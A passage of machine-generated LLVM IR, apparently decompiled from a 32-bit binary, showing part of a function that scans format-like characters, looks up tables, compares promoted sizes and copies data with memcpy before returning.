  %storemerge4 = phi i32 [ -1, %dec_label_pc_804eba3 ], [ %v0_804ea1a, %dec_label_pc_804eb81 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8056dd8.208 to i32), i32* @edx, align 4
  %v4_804ebaf.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ebaf

dec_label_pc_804ebaf:                             ; preds = %dec_label_pc_804ebb9, %dec_label_pc_804ebaa
  %v0_804ebb9 = phi i32 [ %v1_804ebb9, %dec_label_pc_804ebb9 ], [ ptrtoint ([9 x i8]* @global_var_8056dd8.208 to i32), %dec_label_pc_804ebaa ]
  %v4_804ebaf = phi i32 [ %v6_804ebaf, %dec_label_pc_804ebb9 ], [ %v4_804ebaf.pre, %dec_label_pc_804ebaa ]
  %v2_804ebaf = load i8, i8* %.pre, align 1
  %v3_804ebaf = zext i8 %v2_804ebaf to i32
  %v5_804ebaf = and i32 %v4_804ebaf, -256
  %v6_804ebaf = or i32 %v3_804ebaf, %v5_804ebaf
  store i32 %v6_804ebaf, i32* %eax.global-to-local, align 4
  %v3_804ebb1 = inttoptr i32 %v0_804ebb9 to i8*
  %v4_804ebb1 = load i8, i8* %v3_804ebb1, align 1
  %v15_804ebb1 = icmp eq i8 %v2_804ebaf, %v4_804ebb1
  br i1 %v15_804ebb1, label %dec_label_pc_804ea21, label %dec_label_pc_804ebb9

dec_label_pc_804ebb9:                             ; preds = %dec_label_pc_804ebaf
  %v1_804ebb9 = add i32 %v0_804ebb9, 1
  store i32 %v1_804ebb9, i32* @edx, align 4
  %v1_804ebba = inttoptr i32 %v1_804ebb9 to i8*
  %v2_804ebba = load i8, i8* %v1_804ebba, align 1
  %v3_804ebba = icmp eq i8 %v2_804ebba, 0
  %v1_804ebbd = icmp eq i1 %v3_804ebba, false
  br i1 %v1_804ebbd, label %dec_label_pc_804ebaf, label %dec_label_pc_804ebbf

dec_label_pc_804ebbf:                             ; preds = %dec_label_pc_804ebb9, %dec_label_pc_804ea21
  %v0_804ebd2 = phi i32 [ %v1_804ea21, %dec_label_pc_804ea21 ], [ %v0_804ebaf.pre.pre, %dec_label_pc_804ebb9 ]
  %v0_804ebcf = phi i32 [ %v0_804ebb9, %dec_label_pc_804ea21 ], [ %v1_804ebb9, %dec_label_pc_804ebb9 ]
  %v1_804ebc1 = add i32 %v0_804ebcf, -134573528
  %v1_804ebc6 = add i32 %v0_804ebcf, -134573529
  %v5_804ebc6 = sub i32 134573528, %v0_804ebcf
  %v6_804ebc6 = and i32 %v1_804ebc1, %v5_804ebc6
  %v7_804ebc6 = icmp slt i32 %v6_804ebc6, 0
  %v8_804ebc6 = icmp eq i32 %v1_804ebc6, 0
  %v9_804ebc6 = icmp slt i32 %v1_804ebc6, 0
  store i32 %v1_804ebc6, i32* %eax.global-to-local, align 4
  %v3_804ebc7 = icmp eq i1 %v9_804ebc6, %v7_804ebc6
  %v4_804ebc7 = icmp eq i1 %v8_804ebc6, false
  %v5_804ebc7 = and i1 %v4_804ebc7, %v3_804ebc7
  br i1 %v5_804ebc7, label %dec_label_pc_804ebd3, label %dec_label_pc_804ebc9

dec_label_pc_804ebc9:                             ; preds = %dec_label_pc_804ebbf
  %v1_804ebc9 = inttoptr i32 %v0_804ebd2 to i8*
  %v2_804ebc9 = load i8, i8* %v1_804ebc9, align 1
  %v3_804ebc9 = zext i8 %v2_804ebc9 to i32
  %v5_804ebc9 = and i32 %v1_804ebc6, -256
  %v6_804ebc9 = or i32 %v3_804ebc9, %v5_804ebc9
  store i32 %v6_804ebc9, i32* %eax.global-to-local, align 4
  %v3_804ebcb = inttoptr i32 %v0_804ebcf to i8*
  %v4_804ebcb = load i8, i8* %v3_804ebcb, align 1
  %v15_804ebcb = icmp eq i8 %v2_804ebc9, %v4_804ebcb
  %v1_804ebcd = icmp eq i1 %v15_804ebcb, false
  br i1 %v1_804ebcd, label %dec_label_pc_804ebd3, label %dec_label_pc_804ebcf

dec_label_pc_804ebcf:                             ; preds = %dec_label_pc_804ebc9
  %v1_804ebcf = add i32 %v0_804ebcf, 9
  store i32 %v1_804ebcf, i32* @edx, align 4
  %v1_804ebd2 = add i32 %v0_804ebd2, 1
  store i32 %v1_804ebd2, i32* @esi, align 4
  br label %dec_label_pc_804ebd3

dec_label_pc_804ebd3:                             ; preds = %dec_label_pc_804ebc9, %dec_label_pc_804ebbf, %dec_label_pc_804ebcf
  %v4_804ebda = phi i32 [ %v6_804ebc9, %dec_label_pc_804ebc9 ], [ %v1_804ebc6, %dec_label_pc_804ebbf ], [ %v6_804ebc9, %dec_label_pc_804ebcf ]
  %v0_804ebda = phi i32 [ %v0_804ebd2, %dec_label_pc_804ebc9 ], [ %v0_804ebd2, %dec_label_pc_804ebbf ], [ %v1_804ebd2, %dec_label_pc_804ebcf ]
  %v0_804ebd3 = phi i32 [ %v0_804ebcf, %dec_label_pc_804ebc9 ], [ %v0_804ebcf, %dec_label_pc_804ebbf ], [ %v1_804ebcf, %dec_label_pc_804ebcf ]
  %v1_804ebd3 = add i32 %v0_804ebd3, 9
  %v2_804ebd3 = inttoptr i32 %v1_804ebd3 to i8*
  %v3_804ebd3 = load i8, i8* %v2_804ebd3, align 1
  %v4_804ebd3 = sext i8 %v3_804ebd3 to i32
  %v2_804ebd7 = mul nsw i32 %v4_804ebd3, 256
  store i32 %v2_804ebd7, i32* %ebx.global-to-local, align 4
  %v1_804ebda = inttoptr i32 %v0_804ebda to i8*
  %v2_804ebda = load i8, i8* %v1_804ebda, align 1
  %v3_804ebda = zext i8 %v2_804ebda to i32
  %v5_804ebda = and i32 %v4_804ebda, -256
  %v6_804ebda = or i32 %v3_804ebda, %v5_804ebda
  store i32 %v6_804ebda, i32* %eax.global-to-local, align 4
  %v4_804ebdc = icmp eq i8 %v2_804ebda, 0
  br i1 %v4_804ebdc, label %dec_label_pc_804ed90, label %dec_label_pc_804ebe4

dec_label_pc_804ebe4:                             ; preds = %dec_label_pc_804ebd3
  store i32 ptrtoint ([21 x i8]* @global_var_8056e15.209 to i32), i32* %ecx.global-to-local, align 4
  %v3_804ebe9 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804ebe9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ebed

dec_label_pc_804ebed:                             ; preds = %dec_label_pc_804ec3c, %dec_label_pc_804ebe4
  %v0_804ec3c = phi i32 [ %v1_804ec3c, %dec_label_pc_804ec3c ], [ ptrtoint ([21 x i8]* @global_var_8056e15.209 to i32), %dec_label_pc_804ebe4 ]
  %v3_804ebed = inttoptr i32 %v0_804ec3c to i8*
  %v4_804ebed = load i8, i8* %v3_804ebed, align 1
  %v15_804ebed = icmp eq i8 %v2_804ebda, %v4_804ebed
  %v1_804ebef = icmp eq i1 %v15_804ebed, false
  br i1 %v1_804ebef, label %dec_label_pc_804ec3c, label %dec_label_pc_804ebf1

dec_label_pc_804ebf1:                             ; preds = %dec_label_pc_804ebed
  %v1_804ebf3 = add i32 %v0_804ec3c, -134573589
  store i32 %v1_804ebf3, i32* %edx.global-to-local, align 4
  %v7_804ebfc = icmp sgt i32 %v1_804ebf3, 17
  br i1 %v7_804ebfc, label %dec_label_pc_804ebfe, label %dec_label_pc_804ec06

dec_label_pc_804ebfe:                             ; preds = %dec_label_pc_804ebf1
  %v3_804ebfe = and i32 %v2_804ebd7, 1024
  %v4_804ebfe = icmp eq i32 %v3_804ebfe, 0
  br i1 %v4_804ebfe, label %dec_label_pc_804ec06, label %dec_label_pc_804ec03

dec_label_pc_804ec03:                             ; preds = %dec_label_pc_804ebfe
  %v1_804ec03 = add i32 %v0_804ec3c, -134573591
  store i32 %v1_804ec03, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ec06

dec_label_pc_804ec06:                             ; preds = %dec_label_pc_804ebf1, %dec_label_pc_804ebfe, %dec_label_pc_804ec03
  %v0_804ec0f = phi i32 [ %v1_804ebf3, %dec_label_pc_804ebf1 ], [ %v1_804ebf3, %dec_label_pc_804ebfe ], [ %v1_804ec03, %dec_label_pc_804ec03 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056e0b.210 to i32), i32* %ecx.global-to-local, align 4
  %v2_804ec0f = add i32 %tmp76, 32
  %v3_804ec0f = inttoptr i32 %v2_804ec0f to i32*
  store i32 %v0_804ec0f, i32* %v3_804ec0f, align 4
  %v0_804ec12.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804ec16.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ec12

dec_label_pc_804ec12:                             ; preds = %dec_label_pc_804ec12, %dec_label_pc_804ec06
  %v0_804ec12 = phi i32 [ %v1_804ec12, %dec_label_pc_804ec12 ], [ %v0_804ec12.pre, %dec_label_pc_804ec06 ]
  %v1_804ec12 = add i32 %v0_804ec12, 1
  store i32 %v1_804ec12, i32* %ecx.global-to-local, align 4
  %v1_804ec13 = inttoptr i32 %v1_804ec12 to i8*
  %v2_804ec13 = load i8, i8* %v1_804ec13, align 1
  %v3_804ec13 = sext i8 %v2_804ec13 to i32
  store i32 %v3_804ec13, i32* %eax.global-to-local, align 4
  %v8_804ec18 = icmp sgt i32 %v0_804ec16.pre, %v3_804ec13
  br i1 %v8_804ec18, label %dec_label_pc_804ec12, label %dec_label_pc_804ec1a

dec_label_pc_804ec1a:                             ; preds = %dec_label_pc_804ec12
  store i32 ptrtoint ([21 x i8]* @global_var_8056e15.209 to i32), i32* @ecx, align 4
  %v1_804ec21 = add i32 %v0_804ec12, -134573579
  store i32 %v1_804ec21, i32* %eax.global-to-local, align 4
  %v2_804ec26 = add i32 %v0_804ec12, add (i32 ptrtoint (i32* @global_var_8056dfc.211 to i32), i32 -134573579)
  %v3_804ec26 = add i32 %v2_804ec26, %v1_804ec21
  %v4_804ec26 = inttoptr i32 %v3_804ec26 to i16*
  %v5_804ec26 = load i16, i16* %v4_804ec26, align 2
  %v6_804ec26 = sext i16 %v5_804ec26 to i32
  store i32 %v6_804ec26, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804ec21, 2
  %v3_804ec2e = add i32 %factor, 134573548
  %v4_804ec2e = inttoptr i32 %v3_804ec2e to i16*
  %v5_804ec2e = load i16, i16* %v4_804ec2e, align 2
  %v6_804ec2e = sext i16 %v5_804ec2e to i32
  store i32 %v6_804ec2e, i32* %eax.global-to-local, align 4
  %v1_804ec36 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ec36 = or i32 %v1_804ec36, %v6_804ec26
  %v2_804ec38 = and i32 %v2_804ec36, %v6_804ec2e
  store i32 %v2_804ec38, i32* %edx.global-to-local, align 4
  %v0_804ec4a.pre = load i32, i32* @esi, align 4
  %v0_804ec4d.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ec42

dec_label_pc_804ec3c:                             ; preds = %dec_label_pc_804ebed
  %v1_804ec3c = add i32 %v0_804ec3c, 1
  store i32 %v1_804ec3c, i32* @ecx, align 4
  %v1_804ec3d = inttoptr i32 %v1_804ec3c to i8*
  %v2_804ec3d = load i8, i8* %v1_804ec3d, align 1
  %v3_804ec3d = icmp eq i8 %v2_804ec3d, 0
  %v1_804ec40 = icmp eq i1 %v3_804ec3d, false
  br i1 %v1_804ec40, label %dec_label_pc_804ebed, label %dec_label_pc_804ec42

dec_label_pc_804ec42:                             ; preds = %dec_label_pc_804ec3c, %dec_label_pc_804ec1a
  %v0_804ec4d = phi i32 [ %v0_804ec4d.pre, %dec_label_pc_804ec1a ], [ %storemerge4, %dec_label_pc_804ec3c ]
  %v0_804ec4a = phi i32 [ %v0_804ec4a.pre, %dec_label_pc_804ec1a ], [ %v0_804ebda, %dec_label_pc_804ec3c ]
  %v0_804ec42 = phi i32 [ %v2_804ec38, %dec_label_pc_804ec1a ], [ %v3_804ebe9, %dec_label_pc_804ec3c ]
  store i32 %v0_804ec42, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804ec4a = inttoptr i32 %v0_804ec4a to i8*
  %v2_804ec4a = load i8, i8* %v1_804ec4a, align 1
  %v3_804ec4a = sext i8 %v2_804ec4a to i32
  store i32 %v3_804ec4a, i32* %eax.global-to-local, align 4
  %v2_804ec4d = add i32 %tmp76, 4
  %v3_804ec4d = inttoptr i32 %v2_804ec4d to i32*
  store i32 %v0_804ec4d, i32* %v3_804ec4d, align 4
  %v0_804ec50 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec50 = load i32, i32* @edx, align 4
  %v2_804ec50 = add i32 %v1_804ec50, 12
  %v3_804ec50 = inttoptr i32 %v2_804ec50 to i32*
  store i32 %v0_804ec50, i32* %v3_804ec50, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804ec57 = load i32, i32* @edx, align 4
  %v1_804ec57 = add i32 %v0_804ec57, 28
  %v2_804ec57 = inttoptr i32 %v1_804ec57 to i32*
  store i32 1, i32* %v2_804ec57, align 4
  %v0_804ec5e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec5e = load i32, i32* @edx, align 4
  %v2_804ec5e = add i32 %v1_804ec5e, 8
  %v3_804ec5e = inttoptr i32 %v2_804ec5e to i32*
  store i32 %v0_804ec5e, i32* %v3_804ec5e, align 4
  %v0_804ec61 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ec6b = and i32 %v0_804ec61, -5
  %v0_804ec71 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ec71 = and i32 %v0_804ec71, 3840
  store i32 %v1_804ec71, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804ec7a = or i32 %v1_804ec71, %v1_804ec6b
  store i32 %v2_804ec7a, i32* @edi, align 4
  %v1_804ec7c = load i32, i32* @edx, align 4
  %v2_804ec7c = add i32 %v1_804ec7c, 20
  %v3_804ec7c = inttoptr i32 %v2_804ec7c to i32*
  store i32 48, i32* %v3_804ec7c, align 4
  %v0_804ec7f = load i32, i32* @edi, align 4
  %v1_804ec7f = load i32, i32* @edx, align 4
  %v2_804ec7f = add i32 %v1_804ec7f, 16
  %v3_804ec7f = inttoptr i32 %v2_804ec7f to i32*
  store i32 %v0_804ec7f, i32* %v3_804ec7f, align 4
  %v0_804ec82 = load i32, i32* @ecx, align 4
  %v1_804ec82 = inttoptr i32 %v0_804ec82 to i8*
  %v2_804ec82 = load i8, i8* %v1_804ec82, align 1
  %v3_804ec82 = icmp eq i8 %v2_804ec82, 0
  %v1_804ec85 = icmp eq i1 %v3_804ec82, false
  br i1 %v1_804ec85, label %dec_label_pc_804ec9e, label %dec_label_pc_804ec87

dec_label_pc_804ec87:                             ; preds = %dec_label_pc_804ec42
  %v0_804ec87 = load i32, i32* @esi, align 4
  %v1_804ec87 = inttoptr i32 %v0_804ec87 to i8*
  %v2_804ec87 = load i8, i8* %v1_804ec87, align 1
  %v11_804ec87 = icmp eq i8 %v2_804ec87, 109
  %v1_804ec8a = icmp eq i1 %v11_804ec87, false
  br i1 %v1_804ec8a, label %dec_label_pc_804ed90, label %dec_label_pc_804ec90

dec_label_pc_804ec90:                             ; preds = %dec_label_pc_804ec87
  %v0_804ec90 = load i32, i32* @edx, align 4
  %v1_804ec90 = add i32 %v0_804ec90, 32
  %v2_804ec90 = inttoptr i32 %v1_804ec90 to i32*
  store i32 20, i32* %v2_804ec90, align 4
  %v0_804ec97 = load i32, i32* @edx, align 4
  %v1_804ec97 = add i32 %v0_804ec97, 28
  %v2_804ec97 = inttoptr i32 %v1_804ec97 to i32*
  store i32 0, i32* %v2_804ec97, align 4
  br label %dec_label_pc_804ec9e

dec_label_pc_804ec9e:                             ; preds = %dec_label_pc_804ec42, %dec_label_pc_804ec90
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804ed32, label %dec_label_pc_804eca9

dec_label_pc_804eca9:                             ; preds = %dec_label_pc_804ec9e
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_804ecea = add i32 %tmp76, 40
  %v1_804ed23 = add i32 %tmp76, 28
  %v2_804ed23 = inttoptr i32 %v1_804ed23 to i32*
  %v4_804ecb8 = add i32 %tmp76, 36
  br label %dec_label_pc_804ecab

dec_label_pc_804ecab:                             ; preds = %dec_label_pc_804ed1e, %dec_label_pc_804eca9
  %v0_804ecc1 = phi i32 [ 0, %dec_label_pc_804eca9 ], [ %v1_804ed22, %dec_label_pc_804ed1e ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804eca9 ], [ %stack_var_-88.5, %dec_label_pc_804ed1e ]
  %v1_804ecab = add i32 %v0_804ecc1, -2
  %v6_804ecab = sub i32 1, %v0_804ecc1
  %v7_804ecab = and i32 %v6_804ecab, %v0_804ecc1
  %v8_804ecab = icmp slt i32 %v7_804ecab, 0
  %v9_804ecab = icmp eq i32 %v1_804ecab, 0
  %v10_804ecab = icmp slt i32 %v1_804ecab, 0
  %v3_804ecae = icmp eq i1 %v10_804ecab, %v8_804ecab
  %v4_804ecae = icmp eq i1 %v9_804ecab, false
  %v5_804ecae = and i1 %v4_804ecae, %v3_804ecae
  br i1 %v5_804ecae, label %dec_label_pc_804ecc1, label %dec_label_pc_804ecb0

dec_label_pc_804ecb0:                             ; preds = %dec_label_pc_804ecab
  store i32 %tmp76, i32* @edx, align 4
  %v0_804ecb4 = load i32, i32* @esp, align 4
  %v2_804ecb4 = mul i32 %v0_804ecc1, 4
  %v3_804ecb4 = add i32 %v2_804ecb4, 68
  %v4_804ecb4 = add i32 %v3_804ecb4, %v0_804ecb4
  %v5_804ecb4 = inttoptr i32 %v4_804ecb4 to i32*
  %v6_804ecb4 = load i32, i32* %v5_804ecb4, align 4
  store i32 %v6_804ecb4, i32* %eax.global-to-local, align 4
  %v1_804ecb8 = trunc i32 %v6_804ecb4 to i8
  %v5_804ecb8 = add i32 %v4_804ecb8, %v0_804ecc1
  %v6_804ecb8 = inttoptr i32 %v5_804ecb8 to i8*
  store i8 %v1_804ecb8, i8* %v6_804ecb8, align 1
  %v0_804ecbc = load i32, i32* %eax.global-to-local, align 4
  %v1_804ecbc = urem i32 %v0_804ecbc, 256
  br label %dec_label_pc_804ecca

dec_label_pc_804ecc1:                             ; preds = %dec_label_pc_804ecab
  %v5_804ecc3 = add i32 %v0_804ecc1, %stack_var_-32.3
  store i32 %v5_804ecc3, i32* %eax.global-to-local, align 4
  %v1_804ecc7 = add i32 %v5_804ecc3, -2
  br label %dec_label_pc_804ecca

dec_label_pc_804ecca:                             ; preds = %dec_label_pc_804ecb0, %dec_label_pc_804ecc1
  %v0_804ecdd = phi i32 [ %v1_804ecbc, %dec_label_pc_804ecb0 ], [ %v1_804ecc7, %dec_label_pc_804ecc1 ]
  store i32 %v0_804ecdd, i32* %eax.global-to-local, align 4
  %v5_804ecca = sub i32 %v0_804ecdd, %stack_var_-88.4
  %v11_804ecca = xor i32 %v0_804ecdd, %stack_var_-88.4
  %v12_804ecca = xor i32 %v5_804ecca, %v0_804ecdd
  %v13_804ecca = and i32 %v12_804ecca, %v11_804ecca
  %v14_804ecca = icmp slt i32 %v13_804ecca, 0
  %v15_804ecca = icmp eq i32 %v5_804ecca, 0
  %v16_804ecca = icmp slt i32 %v5_804ecca, 0
  %v3_804ecce = icmp ne i1 %v16_804ecca, %v14_804ecca
  %v4_804ecce = or i1 %v15_804ecca, %v3_804ecce
  br i1 %v4_804ecce, label %dec_label_pc_804ecdd, label %dec_label_pc_804ecd0

dec_label_pc_804ecd0:                             ; preds = %dec_label_pc_804ecca
  %v1_804ecd0 = add i32 %v0_804ecdd, -9
  %v6_804ecd0 = sub i32 8, %v0_804ecdd
  %v7_804ecd0 = and i32 %v6_804ecd0, %v0_804ecdd
  %v8_804ecd0 = icmp slt i32 %v7_804ecd0, 0
  %v9_804ecd0 = icmp eq i32 %v1_804ecd0, 0
  %v10_804ecd0 = icmp slt i32 %v1_804ecd0, 0
  %v3_804ecd3 = icmp eq i1 %v10_804ecd0, %v8_804ecd0
  %v4_804ecd3 = icmp eq i1 %v9_804ecd0, false
  %v5_804ecd3 = and i1 %v4_804ecd3, %v3_804ecd3
  br i1 %v5_804ecd3, label %dec_label_pc_804ed90, label %dec_label_pc_804ecdd

dec_label_pc_804ecdd:                             ; preds = %dec_label_pc_804ecd0, %dec_label_pc_804ecca
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804ecca ], [ %v0_804ecdd, %dec_label_pc_804ecd0 ]
  %v1_804ecdd = add i32 %v0_804ecdd, -1
  store i32 %v1_804ecdd, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804ece6 = load i32, i32* @esp, align 4
  %v1_804ece6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ece6 = mul i32 %v1_804ece6, 4
  %v3_804ece6 = add i32 %v0_804ece6, 80
  %v4_804ece6 = add i32 %v3_804ece6, %v2_804ece6
  %v5_804ece6 = inttoptr i32 %v4_804ece6 to i32*
  %v6_804ece6 = load i32, i32* %v5_804ece6, align 4
  store i32 %v6_804ece6, i32* %edi.global-to-local, align 4
  %v2_804ecea = mul i32 %v1_804ecdd, 4
  %v4_804ecea = add i32 %v3_804ecea, %v2_804ecea
  %v5_804ecea = inttoptr i32 %v4_804ecea to i32*
  %v6_804ecea = load i32, i32* %v5_804ecea, align 4
  store i32 %v6_804ecea, i32* @eax, align 4
  %v9_804ecee = icmp eq i32 %v6_804ece6, 8
  br i1 %v9_804ecee, label %dec_label_pc_804ed1e, label %dec_label_pc_804ecf3

dec_label_pc_804ecf3:                             ; preds = %dec_label_pc_804ecdd
  %v9_804ecf3 = icmp eq i32 %v6_804ecea, 8
  br i1 %v9_804ecf3, label %dec_label_pc_804ed0e, label %dec_label_pc_804ecf8

dec_label_pc_804ecf8:                             ; preds = %dec_label_pc_804ecf3
  %v12_804ecf8 = icmp eq i32 %v6_804ecea, %v6_804ece6
  br i1 %v12_804ecf8, label %dec_label_pc_804ed0e, label %dec_label_pc_804ecfc

dec_label_pc_804ecfc:                             ; preds = %dec_label_pc_804ecf8
  %v1_804ecfc = call i32 @_promoted_size(i32 %v1_804ecdd)
  store i32 %v1_804ecfc, i32* %ebx.global-to-local, align 4
  %v0_804ed03 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804ed03, i32* @eax, align 4
  %v1_804ed05 = call i32 @_promoted_size(i32 %v1_804ecdd)
  store i32 %v1_804ed05, i32* %eax.global-to-local, align 4
  %v8_804ed0c = icmp sgt i32 %v1_804ecfc, %v1_804ed05
  br i1 %v8_804ed0c, label %dec_label_pc_804ed1e, label %dec_label_pc_804ecfc.dec_label_pc_804ed0e_crit_edge

dec_label_pc_804ecfc.dec_label_pc_804ed0e_crit_edge: ; preds = %dec_label_pc_804ecfc
  %v0_804ed16.pre = load i32, i32* @esp, align 4
  %v1_804ed16.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ed0e

dec_label_pc_804ed0e:                             ; preds = %dec_label_pc_804ecfc.dec_label_pc_804ed0e_crit_edge, %dec_label_pc_804ecf8, %dec_label_pc_804ecf3
  %v1_804ed16 = phi i32 [ %v1_804ed16.pre, %dec_label_pc_804ecfc.dec_label_pc_804ed0e_crit_edge ], [ %v1_804ece6, %dec_label_pc_804ecf8 ], [ %v1_804ece6, %dec_label_pc_804ecf3 ]
  %v0_804ed16 = phi i32 [ %v0_804ed16.pre, %dec_label_pc_804ecfc.dec_label_pc_804ed0e_crit_edge ], [ %v0_804ece6, %dec_label_pc_804ecf8 ], [ %v0_804ece6, %dec_label_pc_804ecf3 ]
  store i32 %v1_804ecdd, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_804ed16 = mul i32 %v1_804ed16, 4
  %v3_804ed16 = add i32 %v0_804ed16, 80
  %v4_804ed16 = add i32 %v3_804ed16, %v2_804ed16
  %v5_804ed16 = inttoptr i32 %v4_804ed16 to i32*
  %v6_804ed16 = load i32, i32* %v5_804ed16, align 4
  store i32 %v6_804ed16, i32* %eax.global-to-local, align 4
  store i32 %v6_804ed16, i32* %v5_804ecea, align 4
  br label %dec_label_pc_804ed1e

dec_label_pc_804ed1e:                             ; preds = %dec_label_pc_804ecfc, %dec_label_pc_804ecdd, %dec_label_pc_804ed0e
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804ed22 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ed22 = add i32 %v0_804ed22, 1
  store i32 %v1_804ed22, i32* %ebp.global-to-local, align 4
  %v3_804ed23 = load i32, i32* %v2_804ed23, align 4
  %v1_804ed26 = add i32 %v3_804ed23, 2
  store i32 %v1_804ed26, i32* %eax.global-to-local, align 4
  %v5_804ed2b = icmp slt i32 %v1_804ed22, %v1_804ed26
  br i1 %v5_804ed2b, label %dec_label_pc_804ecab, label %dec_label_pc_804ed59

dec_label_pc_804ed32:                             ; preds = %dec_label_pc_804ec9e
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ed36 = add i32 %tmp76, 38
  %v2_804ed36 = inttoptr i32 %v1_804ed36 to i8*
  store i8 1, i8* %v2_804ed36, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804ed3f = add i32 %tmp76, 28
  %v2_804ed3f = inttoptr i32 %v1_804ed3f to i32*
  %v3_804ed3f = load i32, i32* %v2_804ed3f, align 4
  %v2_804ed42 = mul i32 %v3_804ed3f, 4
  %v2_804ed46 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804ed4d = add i32 %tmp76, 40
  store i32 %v1_804ed4d, i32* %eax.global-to-local, align 4
  %v3_804ed51 = inttoptr i32 %v1_804ed4d to i16*
  %v4_804ed51 = call i32 @memcpy(i16* %v3_804ed51, i32 %v2_804ed46, i32 %v2_804ed42)
  store i32 %v4_804ed51, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed59

dec_label_pc_804ed59:                             ; preds = %dec_label_pc_804ed1e, %dec_label_pc_804ed32
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ed32 ], [ %stack_var_-88.5, %dec_label_pc_804ed1e ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_804ea04, align 4
  %v0_804ed64 = load i32, i32* @ecx, align 4
  %v1_804ed64 = add i32 %v0_804ed64, 16
  %v2_804ed64 = inttoptr i32 %v1_804ed64 to i8*
  %v3_804ed64 = load i8, i8* %v2_804ed64, align 1
  %v5_804ed64 = icmp slt i8 %v3_804ed64, 0
  br i1 %v5_804ed64, label %dec_label_pc_804ed71, label %dec_label_pc_804ed6a

dec_label_pc_804ed6a:                             ; preds = %dec_label_pc_804ed59
  %v0_804ed6a = load i32, i32* @esi, align 4
  %v1_804ed6a = add i32 %v0_804ed6a, 1
  store i32 %v1_804ed6a, i32* %eax.global-to-local, align 4
  %v2_804ed6d = inttoptr i32 %v0_804ed64 to i32*
  store i32 %v1_804ed6a, i32* %v2_804ed6d, align 4
  br label %dec_label_pc_804ed84

dec_label_pc_804ed71:                             ; preds = %dec_label_pc_804ed59
  store i32 %v4_804e9d8, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804ed79 = load i32, i32* @esi, align 4
  %v2_804ed79 = sub i32 %v0_804ed79, %v4_804e9d8
  store i32 %v2_804ed79, i32* %esi.global-to-local, align 4
  %v1_804ed7b = mul i32 %v2_804ed79, 4
  %v2_804ed7b = add i32 %v1_804ed7b, 224
  store i32 %v2_804ed7b, i32* %eax.global-to-local, align 4
  %v2_804ed82 = load i32, i32* %arg1, align 4
  %v4_804ed82 = add i32 %v2_804ed82, %v2_804ed7b
  store i32 %v4_804ed82, i32* %arg1, align 4
  br label %dec_label_pc_804ed84

dec_label_pc_804ed84:                             ; preds = %dec_label_pc_804ed6a, %dec_label_pc_804ed71
  store i32 %tmp76, i32* @edx, align 4
  %v1_804ed88 = add i32 %tmp76, 28
  %v2_804ed88 = inttoptr i32 %v1_804ed88 to i32*
  %v3_804ed88 = load i32, i32* %v2_804ed88, align 4
  store i32 %v3_804ed88, i32* %eax.global-to-local, align 4
  %v1_804ed8b = add i32 %v3_804ed88, 2
  br label %dec_label_pc_804ed93

dec_label_pc_804ed90:                             ; preds = %dec_label_pc_804ea29, %dec_label_pc_804eac3, %dec_label_pc_804eaf6, %dec_label_pc_804eb71, %dec_label_pc_804eb5d, %dec_label_pc_804eb54, %dec_label_pc_804ecd0, %dec_label_pc_804ec87, %dec_label_pc_804ebd3
  br label %dec_label_pc_804ed93

dec_label_pc_804ed93:                             ; preds = %dec_label_pc_804ed84, %dec_label_pc_804ed90
  %storemerge6 = phi i32 [ %v1_804ed8b, %dec_label_pc_804ed84 ], [ -1, %dec_label_pc_804ed90 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804ed96 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ed96, i32* @ebx, align 4
  store i32 %v0_804e9d7, i32* @esi, align 4
  store i32 %v0_804e9d6, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_804ed22, { 0, 2, 1 }
  uselistorder i32 %v1_804ecdd, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804ecd0, { 1, 0 }
  uselistorder i32 %v5_804ecca, { 1, 2, 0 }
  uselistorder i32 %v0_804ecdd, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
